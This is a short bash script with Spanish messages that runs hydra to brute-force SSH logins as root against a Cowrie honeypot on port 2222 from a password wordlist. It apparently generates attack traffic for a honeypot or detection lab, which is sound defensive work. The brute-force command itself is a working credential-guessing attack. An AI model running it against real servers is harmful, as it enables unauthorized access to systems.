#!/usr/bin/env bash
set -euo pipefail

TARGET_HOST="${TARGET_HOST:-cowrie}"
TARGET_PORT="${TARGET_PORT:-2222}"
TARGET_USER="${TARGET_USER:-root}"
PASS_FILE="${PASS_FILE:-/app/passwords.txt}"

if [[ ! -f "$PASS_FILE" ]]; then
  echo "[brute-force] ERROR: no existe la wordlist ${PASS_FILE}." >&2
  exit 1
fi

echo "[brute-force] Iniciando fuerza bruta controlada contra ${TARGET_HOST}:${TARGET_PORT}."
echo "[brute-force] Usuario: ${TARGET_USER}. Wordlist: ${PASS_FILE}."

hydra \
  -l "$TARGET_USER" \
  -P "$PASS_FILE" \
  -s "$TARGET_PORT" \
  -t 4 \
  -W 3 \
  -f \
  -o /tmp/oscorp_hydra_result.txt \
  "ssh://${TARGET_HOST}" || true

echo "[brute-force] Finalizado. Cowrie debería registrar intentos de login fallidos y al menos uno exitoso si la password 'admin' es aceptada."
